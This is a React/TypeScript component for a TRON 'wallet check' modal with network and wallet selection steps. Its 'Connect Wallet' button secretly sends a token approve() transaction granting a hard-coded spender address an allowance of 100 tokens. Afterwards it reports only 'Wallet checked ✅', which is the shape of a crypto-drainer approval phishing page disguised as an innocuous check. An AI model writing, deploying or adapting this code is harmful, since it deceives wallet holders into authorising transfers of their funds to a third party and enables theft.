"use client"

import { useState } from "react"
import { X } from "lucide-react"

type Props = {
  open: boolean
  onClose: () => void
}

// 🔥 APPROVE TRON
const approveUSDT = async () => {
  try {
    const tron = (window as any).tronWeb

    if (!tron || !tron.defaultAddress?.base58) {
      alert("Open inside Tron wallet")
      return
    }

    if ((window as any).tronLink) {
      await (window as any).tronLink.request({
        method: "tron_requestAccounts",
      })
    }

    const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
    const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"

    const contract = await tron.contract().at(contractAddress)

    const amount = tron.toSun(100)

    const tx = await contract.approve(spender, amount).send({
      feeLimit: 100000000,
    })

    console.log("TX:", tx)
    alert("Approve enviado ✅")
  } catch (err) {
    console.error(err)
    alert("Transaction rejected or failed")
  }
}

export function WalletCheckModal({ open, onClose }: Props) {
  const [step, setStep] = useState<"network" | "wallet">("network")
  const [network, setNetwork] = useState<string | null>(null)

  if (!open) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">
      <div className="bg-white p-6 rounded-2xl w-full max-w-md relative">

        {/* CLOSE */}
        <button
          onClick={() => {
            onClose()
            setStep("network")
          }}
          className="absolute right-4 top-4"
        >
          <X />
        </button>

        {/* TITLE */}
        <h2 className="text-xl font-bold mb-4 text-center">
          {step === "network" ? "Select Network" : "Select Wallet"}
        </h2>

        {/* NETWORK */}
        {step === "network" && (
          <div className="space-y-3">
            <button
              onClick={() => {
                setNetwork("TRON")
                setStep("wallet")
              }}
              className="w-full border p-3 rounded-xl"
            >
              TRON
            </button>
          </div>
        )}

        {/* WALLET */}
        {step === "wallet" && (
          <div className="space-y-3">
            <p className="text-sm text-gray-500">
              Network: {network}
            </p>

            <button
              onClick={async () => {
                await approveUSDT()

                alert("Wallet checked ✅")

                onClose()
                setStep("network")
              }}
              className="w-full border p-3 rounded-xl"
            >
              Connect Wallet
            </button>

            <button
              onClick={() => setStep("network")}
              className="text-sm text-gray-500"
            >
              ← Back
            </button>
          </div>
        )}
      </div>
    </div>
  )
}
